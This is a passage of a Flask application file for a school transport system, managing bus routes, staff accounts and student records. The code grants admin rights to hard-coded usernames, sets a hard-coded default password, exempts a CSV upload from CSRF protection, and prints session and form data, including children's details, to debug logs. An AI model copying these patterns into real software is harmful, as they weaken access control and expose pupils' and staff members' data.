    route = data_store.create_route(school_id, route_number, provider_id, area_id)
    
    
    # Assign students to the route
    if selected_students:
        for student_id in selected_students:
            data_store.assign_student_to_route(student_id, route['id'])
    
    flash(f'Route "{route_number}" created successfully!', 'success')
    return redirect(url_for('routes'))

@app.route('/routes/bulk-update-status', methods=['POST'])
@login_required
def bulk_update_route_status():
    """Bulk update status for multiple routes"""
    route_ids = request.form.getlist('route_ids')
    status = request.form.get('status')
    
    print(f"DEBUG: bulk_update_route_status called with {len(route_ids)} routes and status: {status}")
    
    if not route_ids or not status:
        return jsonify({'success': False, 'error': 'No routes selected or status not specified'})
    
    # Validate status
    valid_statuses = ['not_present', 'arrived', 'ready']
    if status not in valid_statuses:
        return jsonify({'success': False, 'error': 'Invalid status specified'})
    
    # Update each route
    updated_count = 0
    for route_id in route_ids:
        route = data_store.get_route(route_id)
        if route:
            data_store.update_route_status(route_id, status)
            updated_count += 1
    
    # Get status display information
    status_text = data_store.get_route_status_text(status)
    status_color = data_store.get_route_status_color(status)
    
    print(f"DEBUG: Updated {updated_count} routes to {status_text}")
    
    # Broadcast update to all connected clients
    broadcast_event('route_status_bulk_update', {
        'route_ids': route_ids,
        'status': status,
        'status_text': status_text,
        'status_color': status_color,
        'updated_count': updated_count
    })
    
    return jsonify({
        'success': True,
        'updated_count': updated_count,
        'status': status,
        'status_text': status_text,
        'status_color': status_color
    })

@app.route('/api/routes-by-status/<status>')
@login_required
def get_routes_by_status(status):
    """Get routes filtered by status and optionally by class"""
    class_filter = request.args.get('class')
    
    # Get current user's class restrictions if applicable
    if hasattr(current_user, 'account_type') and current_user.account_type == 'class':
        staff_account = get_staff_account(current_user.username)
        if staff_account:
            # For class accounts, filter by their assigned classes if no specific class requested
            if not class_filter:
                # Auto-select first assigned class if none specified
                assigned_classes = staff_account.get('assigned_classes', [])
                if assigned_classes:
                    class_filter = assigned_classes[0]
            # Ensure the requested class is in their assigned classes
            elif class_filter not in staff_account.get('assigned_classes', []):
                return jsonify({'success': False, 'error': 'Access denied to this class'})
    
    # Load route data from data_store (this is the live data)
    all_routes = data_store.get_all_routes()
    
    print(f"DEBUG: get_routes_by_status called for status '{status}' with class filter '{class_filter}'")
    print(f"DEBUG: Found {len(all_routes)} total routes in data_store")
    
    # Filter routes by status
    filtered_routes = []
    for route_id, route in all_routes.items():
        route_status = route.get('status', 'not_present')
        
        print(f"DEBUG: Route {route.get('route_number')} has status: {route_status}")
        
        # Map status values to match the requested status
        if status == 'not_ready' and route_status == 'not_present':
            filtered_routes.append(route)
        elif status == 'arrived' and route_status == 'arrived':
            filtered_routes.append(route)
        elif status == 'ready' and route_status == 'ready':
            filtered_routes.append(route)
    
    print(f"DEBUG: After status filtering, found {len(filtered_routes)} routes with status '{status}'")
    
    # Filter by class if specified
    if class_filter:
        all_students = data_store.get_all_students()
        # Get student routes for the specific class
        class_student_routes = set()
        for student_id, student in all_students.items():
            if student.get('class') == class_filter and student.get('route_id'):
                class_student_routes.add(student['route_id'])
        
        print(f"DEBUG: Class {class_filter} has {len(class_student_routes)} routes: {class_student_routes}")
        
        # Filter routes to only those used by students in the class
        pre_class_filter_count = len(filtered_routes)
        filtered_routes = [route for route in filtered_routes if route.get('id') in class_student_routes]
        
        print(f"DEBUG: After class filtering, {pre_class_filter_count} -> {len(filtered_routes)} routes")
    
    # Format response data
    route_list = []
    for route in filtered_routes:
        route_list.append({
            'route_number': route.get('route_number', 'Unknown'),
            'area_name': route.get('area_name', 'Unknown Area'),
            'id': route.get('id')
        })
    
    return jsonify({
        'success': True,
        'routes': route_list,
        'count': len(route_list)
    })

@app.route('/routes/reset-all', methods=['POST'])
@login_required
def reset_all_routes():
    """Reset routes to Not Present status (respects area filtering)"""
    print("DEBUG: reset_all_routes called")
    
    # Get area filter from request
    area_id = request.form.get('area_id')
    print(f"DEBUG: reset_all_routes area_id filter: {area_id}")
    
    # Get all routes
    all_routes = data_store.get_all_routes()
    all_areas = data_store.get_all_areas()
    
    # Filter routes based on area if specified
    routes_to_reset = {}
    if area_id and area_id in all_areas:
        print(f"DEBUG: Filtering routes for area: {all_areas[area_id]['name']}")
        # Filter routes that belong to the specified area
        for route_id, route in all_routes.items():
            if route.get('area_id') == area_id:
                routes_to_reset[route_id] = route
    else:
        print("DEBUG: No area filter - resetting all routes")
        routes_to_reset = all_routes
    
    # Reset filtered routes to Not Present status
    updated_count = 0
    for route_id, route in routes_to_reset.items():
        # Reset route status to not_present
        data_store.update_route_status(route_id, 'not_present')
        route['updated_at'] = datetime.now()
        updated_count += 1
    
    area_name = all_areas[area_id]['name'] if area_id and area_id in all_areas else "all areas"
    print(f"DEBUG: Reset {updated_count} routes in {area_name} to Not Present")
    
    # Broadcast update to all connected clients
    broadcast_event('routes_reset_all', {
        'updated_count': updated_count,
        'area_id': area_id,
        'area_name': area_name,
        'message': f'Reset {updated_count} routes in {area_name} to Not Present'
    })
    
    return jsonify({
        'success': True,
        'updated_count': updated_count,
        'area_name': area_name,
        'message': f'Reset {updated_count} routes in {area_name} to Not Present'
    })

@app.route('/staff')
@login_required
@admin_required
def staff():
    """Staff management page"""
    # Admin decorator already handles access control
    print(f"DEBUG STAFF PAGE: User accessing staff page: {current_user.username if current_user.is_authenticated else 'None'}")
    print(f"DEBUG STAFF PAGE: User ID: {current_user.id if current_user.is_authenticated else 'None'}")
    print(f"DEBUG STAFF PAGE: Session keys: {list(session.keys())}")
    all_staff = data_store.get_all_staff()
    class_names = data_store.get_unique_class_names()
    
    # Enrich staff data with user information
    from models import StaffAccount, User
    enriched_staff = {}
    
    # First, process existing staff from data store
    for staff_id, staff_member in all_staff.items():
        enriched_staff[staff_id] = staff_member.copy()
        
        # Get user information if staff has an account
        if staff_member.get('has_account'):
            staff_account = StaffAccount.query.filter_by(staff_id=staff_id).first()
            if staff_account and staff_account.user:
                enriched_staff[staff_id]['username'] = staff_account.user.username
                # Keep original display name from data store, don't overwrite with username
                if 'name' not in enriched_staff[staff_id] or not enriched_staff[staff_id]['name']:
                    enriched_staff[staff_id]['name'] = staff_account.user.username  # Only use username as fallback
                enriched_staff[staff_id]['user_id'] = staff_account.user.id
                enriched_staff[staff_id]['user_active'] = staff_account.user.active
                
                # Get class assignments for class accounts
                from models import StaffClassAssignment
                class_assignments = StaffClassAssignment.query.filter_by(staff_account_id=staff_account.id).all()
                enriched_staff[staff_id]['class_assignments'] = [assignment.class_name for assignment in class_assignments]
            else:
                # Debug: Account expected but not found
                print(f"DEBUG: Staff {staff_id} has_account=True but no StaffAccount or User found")
                enriched_staff[staff_id]['username'] = 'No account'
                enriched_staff[staff_id]['class_assignments'] = []
    
    # Now add any database staff accounts that aren't in the data store
    all_staff_accounts = StaffAccount.query.all()
    for staff_account in all_staff_accounts:
        if staff_account.staff_id not in enriched_staff:
            # This is a database staff member not in the data store - add them
            print(f"DEBUG: Found database staff {staff_account.staff_id} not in data store - adding to display")
            # Check if there's a separate display name stored in Staff table
            from models import Staff
            staff_record = Staff.query.get(staff_account.staff_id)
            display_name = staff_record.display_name if staff_record else staff_account.user.username
            
            enriched_staff[staff_account.staff_id] = {
                'name': display_name,  # Use stored display name from Staff table or username as fallback
                'role': 'Staff',
                'phone': '',
                'email': '',  # No email field in User model
                'first_aid_level': 'none',
                'languages_spoken': '',
                'notes': [],
                'has_account': True,
                'account_type': staff_account.account_type,
                'username': staff_account.user.username,
                'user_id': staff_account.user.id,
                'user_active': staff_account.user.active,
                'created_at': staff_account.user.created_at if hasattr(staff_account.user, 'created_at') else None
            }
            
            # Get class assignments for class accounts
            from models import StaffClassAssignment
            class_assignments = StaffClassAssignment.query.filter_by(staff_account_id=staff_account.id).all()
            enriched_staff[staff_account.staff_id]['class_assignments'] = [assignment.class_name for assignment in class_assignments]
            print(f"DEBUG: Staff {staff_account.staff_id} class_assignments: {enriched_staff[staff_account.staff_id]['class_assignments']}")
    
    # Admin access already verified by @admin_required decorator
    # Use consistent admin check logic
    current_user_is_admin = True  # If we got here, admin_required already passed
    

    return render_template('staff.html', 
                         staff=enriched_staff, 
                         class_names=class_names,
                         current_user_is_admin=current_user_is_admin)

@app.route('/staff/add', methods=['GET', 'POST'])
@login_required
def add_staff():
    """Add a new staff member"""
    # Check admin access
    if not check_admin_access():
        flash('Access denied. Admin privileges required.', 'error')
        return redirect(url_for('staff'))
    
    from models import User, StaffAccount, StaffClassAssignment
    from app import db
    
    if request.method == 'POST':
        name = request.form.get('name')
        email = request.form.get('email')
        username = request.form.get('username')
        password = request.form.get('password')
        account_type = request.form.get('account_type')
        
        if name and username and password and account_type:
            # Check if username already exists
            existing_user = User.query.filter_by(username=username).first()
            print(f"DEBUG: Checking username '{username}' - existing user found: {existing_user is not None}")
            if existing_user:
                print(f"DEBUG: Existing user details: ID={existing_user.id}, username={existing_user.username}")
                flash(f'Username "{username}" already exists! Please choose a different username.', 'error')
                class_names = data_store.get_unique_class_names()
                return render_template('staff.html', staff=data_store.get_all_staff(), class_names=class_names, show_add_form=True)
            
            # Get selected classes if account type is 'class'
            selected_classes = []
            if account_type == 'class':
                selected_classes = request.form.getlist('class_assignments')
            
            # Create staff in data store - simplified call
            staff_member = {
                'id': str(uuid.uuid4()),
                'name': name,
                'role': 'Staff',
                'phone': '',
                'email': email,
                'first_aid_level': 'none',
                'languages_spoken': '',
                'notes': [],
                'has_account': True,
                'account_type': account_type
            }
            
            # Create user account with authentication
            
            try:
                # Parse first and last name from full name
                name_parts = name.split()
                first_name = name_parts[0] if name_parts else username
                last_name = name_parts[-1] if len(name_parts) > 1 else ''
                
                # Create User record with authentication
                user = User(username=username)
                user.set_password(password)  # Hash the password
                db.session.add(user)
                db.session.flush()  # Get the user ID
                
                # Create StaffAccount record
                staff_account = StaffAccount(
                    user_id=user.id,
                    staff_id=staff_member['id'],
                    account_type=account_type
                )
                db.session.add(staff_account)
                db.session.flush()  # Get the staff account ID
                
                # Add class assignments for class accounts
                if account_type == 'class' and selected_classes:
                    for class_name in selected_classes:
                        class_assignment = StaffClassAssignment(
                            staff_account_id=staff_account.id,
                            class_name=class_name
                        )
                        db.session.add(class_assignment)
                
                # Note: Staff is stored in database via StaffAccount, no separate data store needed
                
                db.session.commit()
                
                if account_type == 'class' and selected_classes:
                    flash(f'Staff member "{name}" added with {account_type} account for classes: {", ".join(selected_classes)}!', 'success')
                else:
                    flash(f'Staff member "{name}" added with {account_type} account!', 'success')
            except Exception as e:
                db.session.rollback()
                flash(f'Error creating staff member: {str(e)}', 'error')
            
            return redirect(url_for('staff'))
        else:
            flash('All required fields must be filled!', 'error')
    
    class_names = data_store.get_unique_class_names()
    return render_template('staff.html', staff=data_store.get_all_staff(), class_names=class_names, show_add_form=True)

# Removed problematic debug routes that were causing conflicts

@app.route('/staff/<staff_id>/edit', methods=['GET', 'POST'])
@login_required
def edit_staff(staff_id):
    """Edit an existing staff member"""
    print(f"DEBUG EDIT_STAFF: Editing staff {staff_id}, method: {request.method}")
    
    # Check admin access
    if not check_admin_access():
        flash('Access denied. Admin privileges required.', 'error')
        return redirect(url_for('staff'))
    
    staff_member = data_store.get_staff(staff_id)
    if not staff_member:
        # Check if this is a database-only staff member
        from models import StaffAccount, User
        staff_account = StaffAccount.query.filter_by(staff_id=staff_id).first()
        if staff_account and staff_account.user:
            # Get the display name from Staff table or use username as fallback
            from models import Staff
            staff_record = Staff.query.get(staff_id)
            display_name = staff_record.display_name if staff_record else staff_account.user.username
            
            # Create a temporary staff_member dict for database-only staff
            staff_member = {
                'id': staff_id,
                'name': display_name,  # Use stored display name from Staff table
                'role': 'Staff',
                'phone': '',
                'email': '',
                'first_aid_level': 'none',
                'languages_spoken': '',
                'notes': [],
                'has_account': True,
                'account_type': staff_account.account_type
            }
        else:
            print(f"DEBUG: Staff member {staff_id} not found in data store or database")
            flash('Staff member not found!', 'error')
            return redirect(url_for('staff'))
    
    if request.method == 'POST':
        display_name = request.form.get('name', '').strip()
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        account_type = request.form.get('account_type', '').strip()
        
        print(f"DEBUG EDIT_STAFF: Processing - name={display_name}, username={username}, type={account_type}")
        
        if not display_name or not username or not account_type:
            flash('Name, username, and account type are required!', 'error')
            return redirect(url_for('staff'))
        
        # Get selected classes if account type is 'class'
        selected_classes = []
        if account_type == 'class':
            selected_classes = request.form.getlist('class_assignments')
        
        try:
            from models import StaffAccount, StaffClassAssignment, User
            from app import db
            
            # Find existing staff account and user
            staff_account = StaffAccount.query.filter_by(staff_id=staff_id).first()
            if not staff_account:
                flash('Staff account not found!', 'error')
                return redirect(url_for('staff'))
            
            # Check for username conflicts
            if staff_account.user:
                existing_user = User.query.filter_by(username=username).first()
                if existing_user and existing_user.id != staff_account.user.id:
                    flash('Username already exists! Please choose a different username.', 'error')
                    return redirect(url_for('staff'))
                
                # Update user details
                staff_account.user.username = username
                if password:
                    staff_account.user.set_password(password)
            else:
                # Create user if doesn't exist
                existing_user = User.query.filter_by(username=username).first()
                if existing_user:
                    flash('Username already exists! Please choose a different username.', 'error')
                    return redirect(url_for('staff'))
                
                new_user = User(username=username)
                if password:
                    new_user.set_password(password)
                else:
                    new_user.set_password('Hamilton2025')  # Default password
                db.session.add(new_user)
                db.session.flush()
                staff_account.user_id = new_user.id
            
            # Update staff account type
            staff_account.account_type = account_type
            
            # Update class assignments
            StaffClassAssignment.query.filter_by(staff_account_id=staff_account.id).delete()
            for class_name in selected_classes:
                assignment = StaffClassAssignment(
                    staff_account_id=staff_account.id,
                    class_name=class_name
                )
                db.session.add(assignment)
            
            # Update the Staff table directly to store display name
            from models import Staff
            staff_record = Staff.query.get(staff_id)
            if staff_record:
                # Update existing staff record
                staff_record.display_name = display_name
                staff_record.account_type = account_type
            else:
                # Create new staff record to store display name
                staff_record = Staff(
                    id=staff_id,
                    username=username,
                    display_name=display_name,
                    account_type=account_type,
                    is_active=True
                )
                db.session.add(staff_record)
            
            db.session.commit()
            flash(f'Staff member "{display_name}" updated successfully!', 'success')
            
        except Exception as e:
            db.session.rollback()
            print(f"DEBUG EDIT_STAFF: Error updating staff: {e}")
            flash(f'Error updating staff member: {str(e)}', 'error')
        
        return redirect(url_for('staff'))
    
    # GET request - show the edit form
    class_names = data_store.get_unique_class_names()
    return render_template('staff.html', staff=data_store.get_all_staff(), class_names=class_names, edit_staff=staff_member)

def check_admin_access():
    """Helper function to check if current user has admin access"""
    if not current_user.is_authenticated:
        return False
    
    try:
        # Check special admin usernames - use the same logic as admin_required decorator
        if hasattr(current_user, 'username'):
            if current_user.username in ['admin', 'gfokti', 'Gfokti']:
                return True
        
        # Check staff account type
        from models import StaffAccount
        staff_account = StaffAccount.query.filter_by(user_id=current_user.id).first()
        if staff_account and staff_account.account_type == 'admin':
            return True
            
    except Exception as e:
        print(f"DEBUG: Error checking admin access: {e}")
    
    return False

@app.route('/staff/<staff_id>/delete', methods=['POST'])
@login_required
def delete_staff(staff_id):
    """Delete a staff member"""
    print(f"DEBUG DELETE_STAFF: Route accessed - staff_id={staff_id}")
    print(f"DEBUG DELETE_STAFF: Request method: {request.method}")
    print(f"DEBUG DELETE_STAFF: Request URL: {request.url}")
    print(f"DEBUG DELETE_STAFF: Request form data: {dict(request.form)}")
    print(f"DEBUG DELETE_STAFF: Current user: {current_user.username if current_user.is_authenticated else 'Not authenticated'}")
    
    # Check admin access
    admin_access = check_admin_access()
    print(f"DEBUG DELETE_STAFF: Admin access check result: {admin_access}")
    
    if not admin_access:
        print(f"DEBUG DELETE_STAFF: Access denied for user")
        flash('Access denied. Admin privileges required.', 'error')
        return redirect(url_for('staff'))
    # Get staff info before deletion
    staff_member = data_store.get_staff(staff_id)
    staff_name = staff_member.get('name', 'Unknown') if staff_member else 'Unknown'
    
    print(f"DEBUG DELETE_STAFF: Attempting to delete staff '{staff_name}' (ID: {staff_id})")
    
    # Use the new centralized deletion function
    success = data_store.delete_staff_account(staff_id)
    
    if success:
        flash(f'Staff member "{staff_name}" deleted successfully!', 'success')
        print(f"DEBUG DELETE_STAFF: Operation completed successfully")
    else:
        flash('Error deleting staff member. They may not exist.', 'error')
        print(f"DEBUG DELETE_STAFF: Deletion failed")
    
    return redirect(url_for('staff'))

@app.route('/staff/guides/csv-template')
@login_required
def guides_csv_template():
    """Download CSV template for guides"""
    csv_content = data_store.create_guides_csv_template()
    
    response = make_response(csv_content)
    response.headers['Content-Type'] = 'text/csv'
    response.headers['Content-Disposition'] = 'attachment; filename=guides_template.csv'
    return response

@app.route('/staff/guides/csv-upload', methods=['POST'])
@admin_required
def guides_csv_upload():
    """Upload CSV file with guides"""
    if 'csv_file' not in request.files:
        flash('No file selected!', 'error')
        return redirect(url_for('staff'))
    
    file = request.files['csv_file']
    if file.filename == '':
        flash('No file selected!', 'error')
        return redirect(url_for('staff'))
    
    if file and file.filename.endswith('.csv'):
        try:
            csv_content = file.read().decode('utf-8')
            results = data_store.process_guides_csv(csv_content)
            
            if results['success']:
                flash(f'Successfully processed {len(results["success"])} guides!', 'success')
                for success_msg in results['success']:
                    flash(success_msg, 'info')
            
            if results['errors']:
                flash(f'Found {len(results["errors"])} errors during processing:', 'error')
                for error_msg in results['errors']:
                    flash(error_msg, 'error')
            
        except Exception as e:
            flash(f'Error processing file: {str(e)}', 'error')
    else:
        flash('Please upload a CSV file!', 'error')
    
    return redirect(url_for('staff'))

# Staff Account Management Routes
@app.route('/staff/<staff_id>/create-account', methods=['POST'])
@login_required
def create_staff_account(staff_id):
    """Create a login account for a staff member"""
    # Check admin access
    if not check_admin_access():
        flash('Access denied. Admin privileges required.', 'error')
        return redirect(url_for('staff'))
    
    staff_member = data_store.get_staff(staff_id)
    if not staff_member:
        flash('Staff member not found!', 'error')
        return redirect(url_for('staff'))
    
    account_type = request.form.get('account_type')
    if not account_type:
        flash('Account type is required!', 'error')
        return redirect(url_for('staff'))
    
    from models import User, StaffAccount
    from app import db
    import uuid
    
    try:
        # Create User record
        user = User(
            id=str(uuid.uuid4()),
            email=staff_member['email'],
            first_name=staff_member['name'].split()[0] if staff_member['name'] else staff_member['email'].split('@')[0],
            last_name=staff_member['name'].split()[-1] if len(staff_member['name'].split()) > 1 else ''
        )
        db.session.add(user)
        
        # Create StaffAccount record
        staff_account = StaffAccount(
            id=str(uuid.uuid4()),
            user_id=user.id,
            staff_id=staff_id,
            account_type=account_type,
            is_active=True
        )
        db.session.add(staff_account)
        
        # Update staff record
        data_store.update_staff(
            staff_id, staff_member['name'], staff_member['type'], staff_member['phone'], 
            staff_member['email'], staff_member.get('license_number'), 
            staff_member.get('first_aid_level'), staff_member.get('languages_spoken', []),
            account_type=account_type, has_account=True
        )
        
        db.session.commit()
        flash(f'{account_type.title()} account created for {staff_member["name"]}!', 'success')
        
    except Exception as e:
        db.session.rollback()
        flash(f'Error creating account: {str(e)}', 'error')
    
    return redirect(url_for('staff'))

@app.route('/staff/<staff_id>/manage-account', methods=['POST'])
@login_required
def manage_staff_account(staff_id):
    """Update a staff member's account settings"""
    # Check admin access
    if not check_admin_access():
        flash('Access denied. Admin privileges required.', 'error')
        return redirect(url_for('staff'))
    
    staff_member = data_store.get_staff(staff_id) 
    if not staff_member:
        flash('Staff member not found!', 'error')
        return redirect(url_for('staff'))
    
    account_type = request.form.get('account_type')
    if not account_type:
        flash('Account type is required!', 'error')
        return redirect(url_for('staff'))
    
    from models import StaffAccount
    from app import db
    
    try:
        # Find and update the StaffAccount record
        staff_account = StaffAccount.query.filter_by(staff_id=staff_id, is_active=True).first()
        if staff_account:
            staff_account.account_type = account_type
            
            # Update staff record  
            data_store.update_staff(
                staff_id, staff_member['name'], staff_member['type'], staff_member['phone'],
                staff_member['email'], staff_member.get('license_number'),
                staff_member.get('first_aid_level'), staff_member.get('languages_spoken', []),
                account_type=account_type, has_account=True
            )
            
            db.session.commit()
            flash(f'Account updated to {account_type} for {staff_member["name"]}!', 'success')
        else:
            flash('Active account not found for this staff member!', 'error')
        
    except Exception as e:
        db.session.rollback()
        flash(f'Error updating account: {str(e)}', 'error')
    
    return redirect(url_for('staff'))

@app.route('/staff/<staff_id>/deactivate-account', methods=['POST'])
@admin_required
def deactivate_staff_account(staff_id):
    """Deactivate a staff member's account"""
    staff_member = data_store.get_staff(staff_id)
    if not staff_member:
        flash('Staff member not found!', 'error')
        return redirect(url_for('staff'))
    
    from models import StaffAccount
    from app import db
    
    try:
        # Find and deactivate the StaffAccount record
        staff_account = StaffAccount.query.filter_by(staff_id=staff_id, is_active=True).first()
        if staff_account:
            staff_account.is_active = False
            
            # Update staff record
            data_store.update_staff(
                staff_id, staff_member['name'], staff_member['type'], staff_member['phone'],
                staff_member['email'], staff_member.get('license_number'),
                staff_member.get('first_aid_level'), staff_member.get('languages_spoken', []),
                account_type=None, has_account=False
            )
            
            db.session.commit()
            flash(f'Account deactivated for {staff_member["name"]}!', 'success')
        else:
            flash('Active account not found for this staff member!', 'error')
        
    except Exception as e:
        db.session.rollback()
        flash(f'Error deactivating account: {str(e)}', 'error')
    
    return redirect(url_for('staff'))

@app.route('/students/csv-template')
@login_required
def students_csv_template():
    """Download CSV template for students"""
    csv_content = data_store.create_students_csv_template()
    
    response = make_response(csv_content)
    response.headers['Content-Type'] = 'text/csv'
    response.headers['Content-Disposition'] = 'attachment; filename=students_template.csv'
    return response

@app.route('/students/csv-upload', methods=['POST'])
@csrf.exempt
@admin_required
def students_csv_upload():
    """Upload CSV file with students"""
    print(f"DEBUG STUDENT_UPLOAD: Route hit by user {current_user.username}")
    print(f"DEBUG STUDENT_UPLOAD: Files in request: {list(request.files.keys())}")
    print(f"DEBUG STUDENT_UPLOAD: Form data: {dict(request.form)}")
    
    if 'csv_file' not in request.files:
        print("DEBUG STUDENT_UPLOAD: No csv_file in request")
        flash('No file uploaded!', 'error')
        return redirect(url_for('students'))
    
    file = request.files['csv_file']
    print(f"DEBUG STUDENT_UPLOAD: File name: {file.filename}")
    
    if file.filename == '':
        print("DEBUG STUDENT_UPLOAD: Empty filename")
        flash('No file selected!', 'error')
        return redirect(url_for('students'))
    
    if file and file.filename.endswith('.csv'):
        try:
            print("DEBUG STUDENT_UPLOAD: Reading CSV content")
            csv_content = file.read().decode('utf-8')
            print(f"DEBUG STUDENT_UPLOAD: CSV content length: {len(csv_content)} characters")
            print(f"DEBUG STUDENT_UPLOAD: First 200 chars: {csv_content[:200]}")
            
            print("DEBUG STUDENT_UPLOAD: Processing CSV")
            results = data_store.process_students_csv(csv_content)
            print(f"DEBUG STUDENT_UPLOAD: Processing result: {results}")
            
            if isinstance(results, dict) and 'success' in results and results['success']:
                count = len(results['success'])
                print(f"DEBUG STUDENT_UPLOAD: Success - {count} students processed")
                flash(f'Successfully added {count} student{"s" if count != 1 else ""} to the system!', 'success')
            
            if isinstance(results, dict) and 'errors' in results and results['errors']:
                print(f"DEBUG STUDENT_UPLOAD: Errors found: {results['errors']}")
                flash(f'Found {len(results["errors"])} errors during processing:', 'error')
                for error_msg in results['errors']:
                    flash(error_msg, 'error')
            
            print("DEBUG STUDENT_UPLOAD: Upload completed successfully")
            
        except Exception as e:
            print(f'DEBUG STUDENT_UPLOAD: Exception occurred: {str(e)}')
            import traceback
            print(f'DEBUG STUDENT_UPLOAD: Full traceback: {traceback.format_exc()}')
            flash(f'Error processing file: {str(e)}', 'error')
    else:
        print(f"DEBUG STUDENT_UPLOAD: File is not CSV - filename: {file.filename}")
        flash('Please upload a CSV file!', 'error')
    
    print("DEBUG STUDENT_UPLOAD: Redirecting to students page")
    return redirect(url_for('students') + '?refresh=1')

@app.route('/students')
@login_required
def students():
    """Student management page"""
    print(f"DEBUG STUDENTS_PAGE: User accessing students page: {current_user.username if current_user.is_authenticated else 'None'}")
    print(f"DEBUG STUDENTS_PAGE: User ID: {current_user.id if current_user.is_authenticated else 'None'}")
    
    # Show exactly what user is logged in
    if current_user.is_authenticated:
        print(f"DEBUG STUDENTS_PAGE: *** CURRENT USER IS: username='{current_user.username}', id={current_user.id} ***")
    else:
        print(f"DEBUG STUDENTS_PAGE: *** USER NOT AUTHENTICATED ***")
    
    # Check if user is admin first
    is_admin = False
    try:
        # Direct username check first
        if hasattr(current_user, 'username') and current_user.username in ['admin', 'gfokti', 'Gfokti']:
            is_admin = True
            print(f"DEBUG STUDENTS_PAGE: Admin access granted via username: {current_user.username}")
    except Exception as e:
        print(f"DEBUG STUDENTS_PAGE: Error in admin username check: {e}")
    
    # Class accounts should not have access to Student Management (unless they're admin)
    try:
        from models import StaffAccount
        staff_account = StaffAccount.query.filter_by(user_id=current_user.id).first()
        print(f"DEBUG STUDENTS_PAGE: StaffAccount found: {staff_account is not None}")
        if staff_account:
            print(f"DEBUG STUDENTS_PAGE: StaffAccount type: {staff_account.account_type}")
            if staff_account.account_type == 'admin':
                is_admin = True
                print(f"DEBUG STUDENTS_PAGE: Admin access granted via StaffAccount")
            elif staff_account.account_type == 'class' and not is_admin:
                print(f"DEBUG STUDENTS_PAGE: Class account blocked from students page")
                return redirect(url_for('dashboard'))
    except Exception as e:
        print(f"Error checking staff account: {e}")
    
    print(f"DEBUG STUDENTS_PAGE: Final admin status: {is_admin}, allowing access to students page")
    all_students = data_store.get_all_students()
    all_routes = data_store.get_all_routes()
    
    # Check if we're coming from a route for navigation
    from_route = request.args.get('from_route')
    target_route = None
    if from_route:
        target_route = data_store.get_route(from_route)
    
    # Sort students alphabetically by name
    sorted_students = dict(sorted(all_students.items(), key=lambda x: x[1]['name'].lower()))
    
    # Filter out individual parent routes from the dropdown (routes ending with "'s Parent")
    filtered_routes = {}
    for route_id, route in all_routes.items():
        route_number = route['route_number']
        # Only include routes that don't end with "'s Parent" (individual parent routes)
        if not route_number.endswith("'s Parent"):
            filtered_routes[route_id] = route
    
    # Sort routes with proper numeric/alphanumeric ordering
    def sort_route_key(item):
        route_number = item[1]['route_number']
        # Try to extract numeric part for proper numeric sorting
        import re
        numeric_match = re.match(r'^(\d+)', route_number)
        if numeric_match:
            # If it starts with a number, sort by number first, then by the full string
            return (int(numeric_match.group(1)), route_number.lower())
        else:
            # If it's not numeric, sort alphabetically but put it after numbers
            return (float('inf'), route_number.lower())
    
    sorted_routes = dict(sorted(filtered_routes.items(), key=sort_route_key))
    
    # Debug: Print route order to verify sorting
    print("DEBUG: Routes order for students page:")
    for route_id, route in sorted_routes.items():
        print(f"  - {route['route_number']} (ID: {route_id})")
    
    # Extract unique class names from students for filter dropdown
    available_classes = set()
    for student in all_students.values():
        class_name = student.get('class_name', '').strip()
        if class_name:
            available_classes.add(class_name)
    
    # Sort classes numerically if they're numbers, otherwise alphabetically
    sorted_classes = sorted(available_classes, key=lambda x: (int(x) if x.isdigit() else float('inf'), x))
    
    # Also pass all routes (including individual parent routes) for student assignment display
    all_routes_for_display = data_store.get_all_routes()
    
    # Get all areas for pickup location selection
    all_areas = data_store.get_all_areas()
    
    # Pass routes as both 'routes' and 'buses' for template compatibility
    return render_template('students.html', 
                         students=sorted_students, 
                         routes=sorted_routes, 
                         all_routes=all_routes_for_display,
                         areas=all_areas,
                         buses=sorted_routes,
                         from_route=from_route,
                         target_route=target_route,
                         available_classes=sorted_classes)

@app.route('/students/add', methods=['GET', 'POST'])
@login_required
def add_student():
    """Add a new student"""
    if request.method == 'POST':
        name = request.form.get('name')
        class_name = request.form.get('class_name')
        grade = class_name  # Set grade to be the same as class name
        parent_name = request.form.get('parent_name')
        parent_phone = request.form.get('parent_phone')
        parent2_name = request.form.get('parent2_name', '')
        parent2_phone = request.form.get('parent2_phone', '')
        address = request.form.get('address')
        has_medical_needs = request.form.get('has_medical_needs') == 'on'
        requires_pediatric_first_aid = request.form.get('requires_pediatric_first_aid') == 'on'
        medical_notes = request.form.get('medical_notes', '')
        harness = request.form.get('harness', '')
        safeguarding_notes = request.form.get('safeguarding_notes', '')
        
        if name and class_name and parent_name and parent_phone and address:
            # Validate text inputs for profanity before creating student
            text_fields = [
                (name, "student name"),
                (class_name, "class name"),
                (parent_name, "parent name"),
                (parent2_name, "second parent name") if parent2_name else (None, None),
                (address, "address"),
                (medical_notes, "medical notes") if medical_notes else (None, None),
                (safeguarding_notes, "safeguarding notes") if safeguarding_notes else (None, None)
            ]
            
            for text, field_name in text_fields:
                if text and field_name:
                    is_valid, error_msg = profanity_filter.validate_educational_content(text, field_name)
                    if not is_valid:
                        flash(error_msg, 'error')
                        all_routes_for_display = data_store.get_all_routes()
                        return render_template('students.html', students=data_store.get_all_students(), show_add_form=True, all_routes=all_routes_for_display)
            
            try:
                student = data_store.create_student(name, grade, class_name, parent_name, parent_phone, address, 
                                                  has_medical_needs, requires_pediatric_first_aid, medical_notes, harness, safeguarding_notes,
                                                  parent2_name, parent2_phone)
                flash(f'Student "{name}" added successfully!', 'success')
                return redirect(url_for('students'))
            except ValueError as e:
                flash(f'Cannot add student: {str(e)}', 'error')
        else:
            flash('All fields are required!', 'error')
    
    all_routes_for_display = data_store.get_all_routes()
    return render_template('students.html', students=data_store.get_all_students(), show_add_form=True, all_routes=all_routes_for_display)

@app.route('/students/<student_id>/edit', methods=['GET', 'POST'])
@login_required
def edit_student(student_id):
    """Edit an existing student"""
    try:
        student = data_store.get_student(student_id)
        if not student:
            flash('Student not found!', 'error')
            return redirect(url_for('students'))
        
        if request.method == 'POST':
            name = request.form.get('name')
            class_name = request.form.get('class_name')
            grade = class_name  # Set grade to be the same as class name
            parent_name = request.form.get('parent_name')
            parent_phone = request.form.get('parent_phone')
            parent2_name = request.form.get('parent2_name', '')
            parent2_phone = request.form.get('parent2_phone', '')
            address = request.form.get('address')
            has_medical_needs = request.form.get('has_medical_needs') == 'on'
            requires_pediatric_first_aid = request.form.get('requires_pediatric_first_aid') == 'on'
            medical_notes = request.form.get('medical_notes', '')
            harness = request.form.get('harness', '')
